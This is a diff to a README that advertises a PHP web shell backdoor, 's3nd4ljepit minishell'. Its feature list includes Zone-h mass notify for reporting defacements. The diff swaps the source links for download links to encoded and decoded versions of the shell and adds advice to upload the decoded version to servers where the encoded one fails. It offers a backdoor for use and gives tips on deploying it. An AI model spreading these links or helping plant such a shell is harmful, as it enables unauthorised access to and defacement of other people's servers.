@@ -21,7 +21,9 @@ In this shell backdoor, several useful features are also available to carry out 
 - Zone-h mass notify
 <b>
 Download : <a href="https://github.com/cowokumel/s3nd4ljepit-minishell/">https://github.com/cowokumel/s3nd4ljepit-minishell/</a>
-Raw : <a href="https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sendal.php">https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sendal.php</a>
-Source Shell : <a href="https://ghostbin.com/WP7vl/raw">https://ghostbin.com/WP7vl/raw</a>
-</b>
+Enc Version : <a href="https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-enc.php">https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-enc.php</a>
+Dec Version : <a href="https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-dec.php">https://raw.githubusercontent.com/cowokumel/s3nd4ljepit-minishell/main/sndl-dec.php</a>
+
+Note: actually both are the same, but there are some servers that display an error if using the <i>enc version</i>.
+To solve this, try uploading the <i>dec version</i>.
 </pre>
